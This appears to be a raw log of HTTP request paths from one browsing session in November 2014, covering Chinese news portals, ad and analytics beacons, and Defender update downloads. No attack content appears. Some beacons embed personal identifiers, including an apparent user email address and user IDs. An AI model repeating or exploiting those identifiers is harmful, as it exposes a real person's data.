+/v.gif?pid=307&type=3071&sc=1899,3635,1920,1032&desturl=http://news.baidu.com/&apitype=1&linkid=i329c1ex4qd&velo_load=490&velo_cssload=133&velo_jsLoad=364&cite_uid=745453&cite_type=1&cite_mini=0
+/v.gif?mod=superplus:ps&submod=log&utype=&superver=superplus&portrait=66b267726c31323331323341321830&glogid=3298968492&type=2011&pid=315&version=PCHome&terminal=PC&qid=0xa6d6adb9000703e7&sid=1461_9992_10193_10250_10120_10209_10017_10179_9498_10051_10096_10007_10235_10124_10256_9978_9024&super_frm=&from_login=&from_reg=&query=&curcard=3&curcardtab=&_r=0.17259347764775157&m=superplus:ps_categoryClick&logactid=1200100001&category=tjnews
+/
+/Login/userpage
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/Login
+/iphone/img/loading_3.gif
+/Login/userpage
+/static/channel/ui/html/bdhx.html
+/nocache/mp/b.jpg?cmd=3&0.798363234847784
+/n?m=rddata&v=index_data&callback=bdNewsJsonCallBack&ra=0.8101910904515535
+/Login/self_information
+/finance/index_defau.png
+/h.js?e9e114d958ea263de46e080563e254c4
+/n?tn=json&cmd=1&class=civilnews&rn=20&datano=7&x=_showScrollNews
+/hm.gif?cc=1&ck=1&cl=32-bit&ds=1366x768&et=0&fl=11.3&ja=1&ln=zh-CN&lo=0&lt=1417221895&nv=1&rnd=287772979&si=e9e114d958ea263de46e080563e254c4&st=3&su=http://www.baidu.com/index.php?tn=site5566&v=1.0.70&lv=3&tt=百度新闻搜索——全球最大的中文新闻平台
+/n?m=rddata&v=index_data&type=house&fr=index&rn2=5&callback=bdNewsJsonCallBack_1&ra=0.6752934851683676
+/page/zhuanti/baidu/lottery_w984.shtml?agentId=5538
+/c.gif?t=5&p=1&0.5371715715155005
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/u.gif?ts=6x&sid=i329bobdaku&page=news-index&pid=241&p=133&hid=424&px=1366*768&ver=5&cmd=open
+/u.gif?ts=bp&t=event&sid=i329bobdaku&mid=66&cmd=o
+/quotenew?s2=CNYBA.fx,HKCNBA.fx,ERCNBA.fx,UKCNBA.fx,USDJPY.fx,EURUSD.fx,GBPUSD.fx,?31494.86
+/quote?s2=000001.sh,399001.sz,399300.sz,N225.jp,TWII.tw,STI.sg,FTSE.uk,DAX.de,DJI.us,IXIC.us,SPI.us,CRUDE.nme,GOLD.nme,COPPER.lme,SLIVER.nme,SOYBEAN.cbt,CORN.usb,WHEAT.cbt,HSI001.hk,CCI001.hk,CEI001.hk
+/it/u=http://images.qianlong.com/mmsource/images/2014/11/28/cfbm2014112801.jpg&fm=30
+/pub-config/ca-pub-7584293239613139.js
+/collect?v=1&_v=j31&a=1876077160&t=pageview&_s=1&dl=http://lecai.huanhuba.com/zqmf/lecai.html&dr=http://baidu.lecai.com/page/zhuanti/baidu/lottery_w984.shtml?agentId=5538&ul=zh-cn&de=UTF-8&sd=32-bit&sr=1366x768&vp=982x60&je=1&fl=11.3 r300&_utma=147400494.1579600649.1415098698.1417084890.1417221364.34&_utmz=147400494.1417221364.34.34.utmcsr=baidu.lecai.com|utmccn=(referral)|utmcmd=referral|utmcct=/page/zhuanti/baidu/lottery_w984.shtml&_utmht=1417221895609&_u=MACCAEQAI~&jid=&cid=1579600649.1415098698&tid=UA-43910286-1&z=630421638
+/KsafeSpeedTest/ksafe/queryip.d?ip=173.194.127.71
+/__utm.gif?utmwv=5.6.1&utms=3&utmn=1174117132&utmhn=lecai.huanhuba.com&utmcs=UTF-8&utmsr=1366x768&utmvp=982x60&utmsc=32-bit&utmul=zh-cn&utmje=1&utmfl=11.3 r300&utmhid=1876077160&utmr=http://baidu.lecai.com/page/zhuanti/baidu/lottery_w984.shtml?agentId=5538&utmp=/zqmf/lecai.html&utmht=1417221895593&utmac=UA-31783028-1&utmcc=__utma=147400494.1579600649.1415098698.1417084890.1417221364.34;+__utmz=147400494.1417221364.34.34.utmcsr=baidu.lecai.com|utmccn=(referral)|utmcmd=referral|utmcct=/page/zhuanti/baidu/lottery_w984.shtml;&utmjid=&utmu=qBAAAAAAAAAAAAAAAAAAAAAE~
+/KsafeSpeedTest/ksafe/queryip.d?ip=74.125.235.233
+/Login
+/stock/chart/index/index_1_399001.png?31496.03
+/stock/chart/index/index_1_000001.png?31496.03
+/stock/chart/index/index_1_399300.png?31496.046
+/stock/chart/hki/90001.png?31496.046
+/Login/inner_announce
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/static/plugins/bootstrap/css/bootstrap.min.css
+/static/css/index/login_user.css
+/static/image/toXY.png
+/stock/chart/hki/90006.png?31496.061
+/stock/chart/hki/90007.png?31496.061
+/stat/?project=www_index&event=launched&etype=process&cost=64746&uuid=306b56a647488b14&uemail=934176877@qq.com&unew=1&uctime=1417221854635&utime=1417221897695&ultime=0&uvcount=0&resolution=1366/768&avlbsize=1349/642&pagesize=1349/7943&pagescroll=0/0&url=http://www.163.com/&cvar={"trace_id":1417221833337,"email":"934176877@qq.com","nvsf":"0ef23234de961571d4c79e308063eea9"}&r=0.7892238677013665_1128&pgr=ac46110b022623ce14172218333406022&entry=1&sid=306b56a647488b141417221854640
+/clubapp/pop/p100000.zip
+/channel1/html/dx14_0707b.html
+/qzone/biz/gdt/display/positions/waicai/163_0304_banner_640x100.html?pid=5000408021781206
+/billboard/minsite/ads/163_index2.shtml
+/channel14/dyp_9090_1122.jpg
+/qzone/biz/res/q.js
+/qzone/biz/comm/js/qbs.js
+/cnews/js/ntes_jslib_ui_0.x.js
+/cnews/js/ntes_jslib_1.x.js
+/qzone/biz/res/tmpl/vehicle.html
+/stats?sId=24281718
+/js/version/2014/10/pp.etg.wingdt2.20141027.js?t=20141027155600
+/zh_CN/htmledition/images/spacer.gif
+/zh_CN/htmledition/images/ico_grouplight104474.gif
+/js/adAlterData3.js
+/qzone/biz/ac/comm/qbscomm.20141105.js
+/qzone/biz/ac/comm/gdtlib.20141124.js
+/qzone/biz/ac/comm/ver.20141105.js
+/qzone/biz/res/tmpl/js/mod.js?max_age=31104000
+/qzone/biz/comm/js/qbs.js
+/special/www_zhiye/
+/qzone/biz/gdt/comm/etg_showcase.js
+/special/00824IH1/163jiuxiang_v2.html
+/special/00824IH1/163jiupin_v2.html
+/pingd?dm=union.paipai.com&pvi=8634899456&si=s6084468736&url=/billboard/minsite/ads/163_index2.shtml&arg=&ty=1&rdm=g.163.com&rurl=/r&rarg=site=netease&affiliate=homepage&cat=homepage&type=logo300x250&location=4&adt=&r2=24281718&r3=-1&r4=1&fl=15.0&scr=1366x768&scl=24-bit&lg=zh-cn&jv=1&tz=-8&ct=&ext=adid=&pf=&random=1417221898003
+/cnews/js/ntes_jslib_1.x.js
+/update/20140531/index_26.jpg
+/update/20131114/etg_outsite_circle.png
+/cnews/2014/11/28/20141128095559c62fe.jpg
+/f2e/lib/js/ne.js
+/cnews/2014/11/27/2014112708314363756.jpg
+/f2e/component/switch/switch_prototype.734886.min.js
+/qzone/biz/comm/jquery/jquery-1.10.2.js?max_age=31104000
+/qzone/biz/res/tmpl/mod//gdt_0fe3f76.js
+/qzone/biz/res/tmpl/mod//mod/preset_8b4b145.js?max_age=31536000
+/cnews/2014/11/20/20141120110439d532b.jpg
+/cnews/2014/11/20/20141120110917f7f3e.jpg
+/cnews/2014/11/25/2014112509113494640.jpg
+/cnews/2014/11/28/20141128183254210f4.jpg
+/f2e/wine/jiuyou_ads/images/jy_news_ad.png
+/cnews/2014/11/20/20141120110759a110c.jpg
+/cnews/2014/7/29/201407291539499d37f.jpg
+/ipquery
+/Login
+/f2e/wine/net_mod/images/hot_rec_t.jpg
+/f2e/wine/jiuyou_ads/images/jiuxiang_icon1.png
+/special/www_ifr_hn/
+/www/v2013/img/icon.png
+/house/2014/11/27/20141127114157dddc4.jpg
+/1414407332.ini?t=1298411
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/qzone/biz/res/tmpl/mod//mod/stylish_2eb8d09.js?max_age=31536000
+/qzone/biz/res/tmpl/mod//mod/style_640x100_3x1_vpoll_e0ec42a.js?max_age=31536000
+/qzone/biz/res/tmpl/mod//mod/stat_ecb3c2a.js?max_age=31536000
+/stat?mid=80451f39a4dc467e54c9ffe469d1a997&type=955&k1=e6966ecf03d98186968b23c671f50eec&k2=1,0,3,1260
+/stat?mid=80451f39a4dc467e54c9ffe469d1a997&type=953&k1=1&k2=1,0,3,1260&k3=125&k4=2731&k5=133&k6=1&t=1298692
+/u.gif?ts=2gu&sid=i329bobdaku&page=news-index&pid=241&p=133&hid=424&px=1366*768&ver=5&xp=A5(b)AA2AAA4C5&g=focustop-carousel&ep=.000,.000&ci=1&pp=0,0&ps=1366,8282&u=none&txt=4
+/v.gif?pid=107&url=&type=0&c=top&a=51&col=4&ct=1&m=11&pn=4&u=&t=&ra=0.32722595729865134
+/information/rank
+/static/fonts/myriad-set-pro_ultralight.woff
+/favicon.ico
+/favicon.ico
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/qzone/biz/gdt/display/modules/mod/stat_32327a0.js?max_age=31536000
+/pingd?cc=-&ct=-&java=1&lang=-&pf=-&scl=-&scr=-&tt=-&tz=-8&vs=3.3&dm=gdt.qq.com&url=/union/gdt/5000408021781206&rdm=popme.163.com&rurl=/link/017932_1030_8789.html&sds=0.6757178222760558
+/osd/hbe.swf?id=0~0
+/view.fcg?adposcount=1&posid=5000905001971914&count=7&ptag=&ext={"req":{"rst":"1366*768","webp":"1"},"pos":{"0":{"classlist":""}}}&qz_caller=qzfl_jg&_r=274311&charset=utf8&datafmt=jsonp&g_tk=5381
+/view.fcg?adposcount=1&posid=5000408021781206&count=15&ext={"req":{"rst":"1366*768","webp":"1"},"pos":{"0":{}}}&qz_caller=qzfl_jg&_r=504500&charset=utf8&datafmt=jsonp&g_tk=5381
+/bc43b33b/expr-5451B3BD-00000000A0C71A8B5451B3BD000A71CE.1.jpg
+/3da00b8a/expr-5476CA11-000000006301FD715476CA1100030F67.1.jpg
+/df080fb5/expr-544880A1-0000000083AC0D0B544880A1000AB8F0.1.jpg
+/d6e6c723/expr-5477C729-0000000087979B4B5477C729000B0520.1.jpg
+/26bfe2e2/expr-5476949B-000000009F7DEA7F5476949B00036BD0.1.jpg
+/c0e1bfe4/expr-546EF01A-00000000734A5A71546EF01A0007475F.1.jpg
+/9402f3b2/expr-546D6D98-0000000048599A9E546D6D98000ECA0D.1.jpg
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/platform/event_refresh
+/qzone/biz/gdt/display/modules/mod/match_9bd4cf7.js?max_age=31536000
+/js/adAlterData.js
+/qzone/biz/res/tmpl/css/style_640x100_3x1.css
+/695f1857/expr-5474470A-000000009F7DEA7F5474470A0004B84B.1.jpg
+/f4e1003f/expr-5461CF01-0000000083AC0D0B5461CF010004451E.1.jpg
+/0e471cb7/expr-545F244C-00000000A0C71A8B545F244C00019159.1.jpg
+/code.cgi?domain=express.paipai.com&cgi=http://express.paipai.com/gdt?posid=5000905001971914&type=1&code=20&time=1712&rate=1&0.719688334967941
+/ed09a348/expr-546C23D3-000000006D667F83546C23D30006C457.1.jpg
+/ceacdd1c/expr-5476A215-000000001AE09F095476A21500070D24.1.jpg
+/3a766075/expr-5476E38A-00000000AEC2A3E15476E38A00004F14.1.jpg
+/qzone/biz/gdt/display/modules/mod/poller_9e93484.js?max_age=31536000
+/tws/expcomm/ExpViewAdStat?commid=0B0DAC8300000000040100001C163729|9E9A594800000000040100003B5C2CC6&filter=3&callback=priceAdCallback1000
+/264c05e6/expr-5461606C-000000007962EE285461606C0004086B.1.jpg
+/99522bbd/expr-5474275F-00000000869969685474275F000354A6.1.jpg
+/5abeaaf8/expr-547160A1-00000000B4329FBA547160A1000852CA.1.jpg
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.20053508039563894
+/3a039f73/expr-54616CBA-000000008CD0BBE654616CBA000E83AF.1.jpg
+/f4686447/expr-54769318-00000000734A5A715476931800019696.1.jpg
+/u.gif?ts=3xp&sid=i329bobdaku&page=news-index&pid=241&p=133&hid=424&px=1366*768&ver=5&xp=A5(b)AA2AAAC2&g=focustop-carousel&ep=.156,.467&ci=2&pp=1124,327&ps=1366,8282&u=none&txt=none
+/12460ac1/expr-54664133-00000000053064CF546641330000DA65.1.jpg
+/update/20140905/pcd_213415825.jpg
+/82f340db/expr-54714E16-000000007A7C489854714E160001B325.1.jpg
+/qzone/biz/res/tmpl/images/waicai/640-100_01.jpg
+/c.gif?t=5&p=2&q=&ra=0.9648642931133509
+/update/20130926/pcd_210-130.jpg
+/hm.gif?cc=1&ck=1&cl=32-bit&ds=1366x768&ep=[{x:538,y:337,t:b},{x:441,y:327,t:a,u:javascript%3Avoid(0)%3B}]&et=2&fl=11.3&ja=1&ln=zh-CN&lo=0&lt=1417221895&nv=1&rnd=1588261049&si=e9e114d958ea263de46e080563e254c4&st=3&su=http://www.baidu.com/index.php?tn=site5566&v=1.0.70&lv=3&tt=百度新闻搜索——全球最大的中文新闻平台
+/Login/userpage
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.20053508039563894
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/gdt_stats.fcg?viewid=_NwcPWAMCh4shpoTMhDZKk3cCDHfWodNIXVZ92lKLzrkho3REGsAvtZZh4YKnEl895eIAc_QS7RJ7X7l6r8yK3yluLPFbALdx6R6AbaFs_xeX1xv3Lt9dLFCrUoPVqgCw6!zWHddCwk9Eb2j_i5CPaEdT0zQSUmKG0ytyNhoMS6VHkajVG8wLvwMzqXldpgkBfgwoirEZ_Y40jIXDyhgdXvgLkUrGcba&i=1&datatype=jsonp&callback=_cb_gdtjson1
+/code.cgi?domain=express.paipai.com&cgi=http://express.paipai.com/tws/expcomm/ExpViewAdStat?bizId=adcard&type=1&code=20&time=1011&rate=1&0.864111005095765
+/Login
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/poll?r=0.4514114474877715&u=648629762&s=7&k=H3mhqTxNAk6pJpqp&t=0&i=30&r=0.521716334624216
+/gdt_stats.fcg?viewid0=2G40eJQY_IAnbpz4Koss0!kF_IfSexE0W4WgGc7s_05B09M3FpWuTJPsfXDXpHRgB5iYxnEbvFDOv_v8dYbNPvah7WtHhmux_ywMb9LUAxus84RSjGbDELAOwPy4siaFesx2R3GjZJ5Bh37U8QUUBDGEWSJ4XP9oQ6ghnmaiO2Hbd01y_pRubQ9HM27Rj5OEW_Tm4IRCOsbQFdlHJgL575VzIOPBkHZ9&viewid1=K3mUsDHmgGMnbpz4Koss07mhTdlJFfnA5TLqUViCszERCBGSIRRyXV7BT3Ds7uJZMWSkOH23QZrK0OnfjFN0Qpg7HvUqz!3_AWDYmM3th_dEl5xm1bFArZzQR3zsvcTKf3F8amdfkz7kqQKlsjNIKTcMzWsz1Aq!B6J8yt16vGW7hXLok_X4pkbPl6htXnKeN85t81lc6Oig9BER1kFQJfFkg5lr08rX&viewid2=K3mUsDHmgGMnbpz4Koss0_Bi89O0cfyE6f6B43SSkuURCBGSIRRyXV7BT3Ds7uJZMWSkOH23QZrK0OnfjFN0Qi9crGRfNPQyAWDYmM3th_dEl5xm1bFArZzQR3zsvcTKRJUYOpSvivuMBdBksfyfEDcMzWsz1Aq!B6J8yt16vGUyoP83rU8U8kbPl6htXnKeN85t81lc6OhvtKu9or3cLB_KgZbQPYeC&count=3
+/query?1417221898
+/u.gif?ts=5sv&sid=i329bobdaku&page=news-index&pid=241&p=133&hid=424&px=1366*768&ver=5&xp=A5(b)AA2AAAC2&g=focustop-carousel&ep=.156,.467&ci=3&pp=1124,327&ps=1366,8282&u=none&txt=none
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.8411064024548978
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.8411064024548978
+/c.gif?t=5&p=2&q=&ra=0.8635594469960779
+/hm.gif?cc=1&ck=1&cl=32-bit&ds=1366x768&ep=[{x:441,y:327,t:a,u:javascript%3Avoid(0)%3B}]&et=2&fl=11.3&ja=1&ln=zh-CN&lo=0&lt=1417221895&nv=1&rnd=464589068&si=e9e114d958ea263de46e080563e254c4&st=3&su=http://www.baidu.com/index.php?tn=site5566&v=1.0.70&lv=3&tt=百度新闻搜索——全球最大的中文新闻平台
+/2/remind/unread_count.json?uid=1992245353&unread_message=1&group_id=221102260100003958&source=140226478
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/Login/userpage
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.7351419914048165
+/u.gif?ts=6ct&sid=i329bobdaku&page=news-index&pid=241&p=133&hid=424&px=1366*768&ver=5&xp=A5(b)AA2AAAC2&g=focustop-carousel&ep=.156,.467&ci=4&pp=1124,327&ps=1366,8282&u=none&txt=none
+/poll?r=0.943200474139303&u=657972246&s=7&k=6Yak8190Ftw3J5I3&t=0&i=30&r=0.9574830075725913
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.7351419914048165
+/c.gif?t=5&p=2&q=&ra=0.39804522530175745
+/hm.gif?cc=1&ck=1&cl=32-bit&ds=1366x768&ep=[{x:441,y:327,t:a,u:javascript%3Avoid(0)%3B}]&et=2&fl=11.3&ja=1&ln=zh-CN&lo=0&lt=1417221895&nv=1&rnd=2042431093&si=e9e114d958ea263de46e080563e254c4&st=3&su=http://www.baidu.com/index.php?tn=site5566&v=1.0.70&lv=3&tt=百度新闻搜索——全球最大的中文新闻平台
+/platform
+/a.js?ch=0&jk=6083034df725a6fa&n=hqcom_cpr&tu=u1364901&word=http://world.huanqiu.com/photo/2014-11/2754043.html&if=0&aw=0&ah=0&pt=11772&it=0&vt=0&csp=1920,1032&bcl=1899,947&pof=1899,3634&top=248&left=0&total=1&rdm=1417221922094
+/a.js?did=5&ch=0&jk=aa770dce4e32aa8e&tn=baiduCustSTagLinkUnit&n=hqcom_cpr&js=c&tu=959746&word=http://world.huanqiu.com/photo/2014-11/2754043.html&if=0&aw=960&ah=180&pt=11589&it=0&vt=0&csp=1920,1032&bcl=1899,947&pof=1899,3674&top=2643&left=469&total=5&rdm=1417221922125
+/v.gif?pid=307&type=3075&l=9449&t=348&s=7835&v=947&f=9000&r=http://news.baidu.com/&u=http://world.huanqiu.com/photo/2014-11/2754043.html
+/v.gif?pid=307&type=3075&l=9668&t=0&s=9668&v=278&f=0&r=http://world.huanqiu.com/photo/2014-11/2754043.html&u=http://comment.huanqiu.com/commentiframe.html
+/a.js?did=6&ch=0&jk=104296a3611a2397&tn=baiduCustSTagLinkUnit&n=hqcom_cpr&js=c&tu=959623&word=http://world.huanqiu.com/photo/2014-11/2754043.html&if=0&aw=640&ah=60&pt=11581&it=0&vt=0&csp=1920,1032&bcl=1899,947&pof=1899,3674&top=2828&left=469&total=5&rdm=1417221922126
+/a.js?did=4&ch=0&jk=2b65033336c909ee&tn=text_default_960_90&n=hqcom_cpr&js=c&tu=959755&word=http://world.huanqiu.com/photo/2014-11/2754043.html&if=0&aw=960&ah=90&pt=11577&it=0&vt=0&csp=1920,1032&bcl=1899,947&pof=1899,3674&top=1827&left=469&total=5&rdm=1417221922127
+/photo/2014-11/2754043_2.html
+/a.js?did=0&ch=0&jk=31c4d8da8f4258ab&tn=template_float_all_normal&n=hqcom_cpr&js=f&exp=60002&tu=undefined&word=http://world.huanqiu.com/photo/2014-11/2754043.html&if=0&aw=130&ah=360&pt=11269&it=11310&vt=11310&csp=1920,1032&bcl=1899,947&pof=1899,3689&top=398&left=1460&total=5&rdm=1417221922127
+/a.js?did=0&ch=0&jk=31c4d8da8f4258ab&tn=template_float_all_normal&n=hqcom_cpr&js=f&exp=60002&tu=undefined&word=http://world.huanqiu.com/photo/2014-11/2754043.html&if=0&aw=130&ah=360&pt=11265&it=11310&vt=11310&csp=1920,1032&bcl=1899,947&pof=1899,3689&top=398&left=309&total=5&rdm=1417221922128
+/hm.gif?cc=1&ck=1&cl=24-bit&ds=1920x1080&ep=12399,12399&et=3&fl=15.0&ja=1&ln=zh-CN&lo=0&nv=0&rnd=1121508223&si=1fc983b4c305d209e7e05d96e713939f&st=4&su=http://news.baidu.com/&v=1.0.70&lv=1&tt=Hello Kitty主题公园首落户中国 日卡通文化积极入华_国际新闻_环球网
+/c/
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.15214790753088892
+/u.gif?ts=73o&sid=i329bobdaku&page=news-index&pid=241&p=133&hid=424&px=1366*768&ver=5&xp=A5(b)AA2AAAC2&g=focustop-carousel&ep=.156,.467&ci=5&pp=1124,327&ps=1366,8282&u=none&txt=none
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.15214790753088892
+/c.gif?t=5&p=2&q=&ra=0.43921164190396667
+/query?1417221904
+/c/
+/hm.gif?cc=1&ck=1&cl=32-bit&ds=1366x768&ep=[{x:441,y:327,t:a,u:javascript%3Avoid(0)%3B}]&et=2&fl=11.3&ja=1&ln=zh-CN&lo=0&lt=1417221895&nv=1&rnd=1708780734&si=e9e114d958ea263de46e080563e254c4&st=3&su=http://www.baidu.com/index.php?tn=site5566&v=1.0.70&lv=3&tt=百度新闻搜索——全球最大的中文新闻平台
+/?c=hits&a=addHits&id=2754043&catid=127
+/css/huanqiuTieStyles.css?&_i329ca6v
+/attachment2010/2014/1129/20141129065328557.jpg
+/cmspic/002/75/40/43_1.html?callback=setDivContent&_=1417221922745
+/jsq/changeskin2.ini?r=6492218
+/h.js?1fc983b4c305d209e7e05d96e713939f
+/hm.gif?cc=1&ck=1&cl=24-bit&ds=1920x1080&ep=12399,12399&et=3&fl=15.0&ja=1&ln=zh-CN&lo=0&nv=0&rnd=1121508223&si=1fc983b4c305d209e7e05d96e713939f&st=4&su=http://news.baidu.com/&v=1.0.70&lv=1&tt=Hello Kitty主题公园首落户中国 日卡通文化积极入华_国际新闻_环球网&u=http://world.huanqiu.com/photo/2014-11/2754043.html
+/hm.gif?cc=1&ck=1&cl=24-bit&ds=1920x1080&et=0&fl=15.0&ja=1&ln=zh-CN&lo=0&lt=1417221910&nv=0&rnd=1913719214&si=1fc983b4c305d209e7e05d96e713939f&st=4&su=http://world.huanqiu.com/photo/2014-11/2754043.html&v=1.0.70&lv=2
+/acom?di=u1364901&dcb=BAIDU_DUP2_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=2&dci=0&dri=0&dis=0&dai=1&dds=&drs=1&dvi=1414464365&ltu=http://world.huanqiu.com/photo/2014-11/2754043_2.html&liu=&ltr=http://world.huanqiu.com/photo/2014-11/2754043.html&lcr=http://news.baidu.com/&ps=0x0&psr=1920x1080&par=1920x1032&pcs=1899x947&pss=1899x3688&pis=-1x-1&cfv=15&ccd=24&chi=2&cja=true&cpl=36&cmi=55&cce=true&col=zh-CN&cec=UTF-8&cdo=-1&tsr=5&tlm=1417221923&tcn=1417221923&tpr=1417221923063&dpt=none&coa=&baidu_id=
+/ecom?di=959951&dcb=BAIDU_DUP_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=2&dci=2&dri=0&dis=0&dai=1&dds=&drs=1&dvi=1410832926&ltu=http://world.huanqiu.com/photo/2014-11/2754043_2.html&liu=&ltr=http://world.huanqiu.com/photo/2014-11/2754043.html&lcr=http://news.baidu.com/&ps=54x469&psr=1920x1080&par=1920x1032&pcs=1899x947&pss=1899x3688&pis=-1x-1&cfv=15&ccd=24&chi=2&cja=true&cpl=36&cmi=55&cce=true&col=zh-CN&cec=UTF-8&cdo=-1&tsr=377&tlm=1417221923&tcn=1417221923&tpr=1417221923063&dpt=none&coa=&baidu_id=
+/ecom?di=959952&dcb=BAIDU_DUP_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=2&dci=2&dri=0&dis=0&dai=2&dds=&drs=1&dvi=1410832926&ltu=http://world.huanqiu.com/photo/2014-11/2754043_2.html&liu=&ltr=http://world.huanqiu.com/photo/2014-11/2754043.html&lcr=http://news.baidu.com/&ps=1982x1129&psr=1920x1080&par=1920x1032&pcs=1899x947&pss=1899x3688&pis=-1x-1&cfv=15&ccd=24&chi=2&cja=true&cpl=36&cmi=55&cce=true&col=zh-CN&cec=UTF-8&cdo=-1&tsr=380&tlm=1417221923&tcn=1417221923&tpr=1417221923063&dpt=none&coa=&baidu_id=
+/ecom?di=959953&dcb=BAIDU_DUP_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=2&dci=2&dri=0&dis=0&dai=3&dds=&drs=1&dvi=1410832926&ltu=http://world.huanqiu.com/photo/2014-11/2754043_2.html&liu=&ltr=http://world.huanqiu.com/photo/2014-11/2754043.html&lcr=http://news.baidu.com/&ps=1994x1129&psr=1920x1080&par=1920x1032&pcs=1899x947&pss=1899x3688&pis=-1x-1&cfv=15&ccd=24&chi=2&cja=true&cpl=36&cmi=55&cce=true&col=zh-CN&cec=UTF-8&cdo=-1&tsr=384&tlm=1417221923&tcn=1417221923&tpr=1417221923063&dpt=none&coa=&baidu_id=
+/ecom?di=959755&dcb=BAIDU_DUP_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=2&dci=2&dri=0&dis=0&dai=4&dds=&drs=1&dvi=1410832926&ltu=http://world.huanqiu.com/photo/2014-11/2754043_2.html&liu=&ltr=http://world.huanqiu.com/photo/2014-11/2754043.html&lcr=http://news.baidu.com/&ps=1880x469&psr=1920x1080&par=1920x1032&pcs=1899x947&pss=1899x3688&pis=-1x-1&cfv=15&ccd=24&chi=2&cja=true&cpl=36&cmi=55&cce=true&col=zh-CN&cec=UTF-8&cdo=-1&tsr=386&tlm=1417221923&tcn=1417221923&tpr=1417221923063&dpt=none&coa=&baidu_id=
+/ecom?di=959746&dcb=BAIDU_DUP_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=2&dci=2&dri=0&dis=0&dai=5&dds=&drs=1&dvi=1410832926&ltu=http://world.huanqiu.com/photo/2014-11/2754043_2.html&liu=&ltr=http://world.huanqiu.com/photo/2014-11/2754043.html&lcr=http://news.baidu.com/&ps=2696x469&psr=1920x1080&par=1920x1032&pcs=1899x947&pss=1899x3688&pis=-1x-1&cfv=15&ccd=24&chi=2&cja=true&cpl=36&cmi=55&cce=true&col=zh-CN&cec=UTF-8&cdo=-1&tsr=390&tlm=1417221923&tcn=1417221923&tpr=1417221923063&dpt=none&coa=&baidu_id=
+/ecom?di=959623&dcb=BAIDU_DUP_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=2&dci=2&dri=0&dis=0&dai=6&dds=&drs=1&dvi=1410832926&ltu=http://world.huanqiu.com/photo/2014-11/2754043_2.html&liu=&ltr=http://world.huanqiu.com/photo/2014-11/2754043.html&lcr=http://news.baidu.com/&ps=2881x469&psr=1920x1080&par=1920x1032&pcs=1899x947&pss=1899x3688&pis=-1x-1&cfv=15&ccd=24&chi=2&cja=true&cpl=36&cmi=55&cce=true&col=zh-CN&cec=UTF-8&cdo=-1&tsr=392&tlm=1417221923&tcn=1417221923&tpr=1417221923063&dpt=none&coa=&baidu_id=
+/acom?adn=0&at=103&aurl=&cad=1&ccd=24&cec=UTF-8&cfv=15&ch=0&col=zh-CN&conOP=0&cpa=1&dai=1&dis=0&ltr=http://world.huanqiu.com/photo/2014-11/2754043.html&ltu=http://world.huanqiu.com/photo/2014-11/2754043_2.html&lunum=6&n=hqcom_cpr&pcs=1899x947&pis=10000x10000&ps=0x0&psr=1920x1080&pss=1899x3688&qn=2b2160a697635df7&rad=&rsi0=420&rsi1=350&rsi5=4&rss0=&rss1=&rss2=&rss3=&rss4=&rss5=&rss6=&rss7=&scale=&skin=tabcloud_skin_12&stid=5&td_id=1364901&tn=baiduCustSTagLinkUnit&tpr=1417221923063&ts=1&xuanting=0&dtm=BAIDU_DUP2_SETJSONADSLOT&dc=2&di=u1364901
+/ecom?di=1007910&dcb=BAIDU_DUP_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=2&dci=0&dri=0&dis=0&dai=7&dds=&drs=1&dvi=1410832926&ltu=http://world.huanqiu.com/photo/2014-11/2754043_2.html&liu=&ltr=http://world.huanqiu.com/photo/2014-11/2754043.html&lcr=http://news.baidu.com/&ps=3688x0&psr=1920x1080&par=1920x1032&pcs=1899x947&pss=1899x3688&pis=-1x-1&cfv=15&ccd=24&chi=2&cja=true&cpl=36&cmi=55&cce=true&col=zh-CN&cec=UTF-8&cdo=-1&tsr=459&tlm=1417221923&tcn=1417221923&tpr=1417221923063&dpt=none&coa=&baidu_id=
+/Login/self_information
+/ex?i=mm_18021420_2310348_27460204
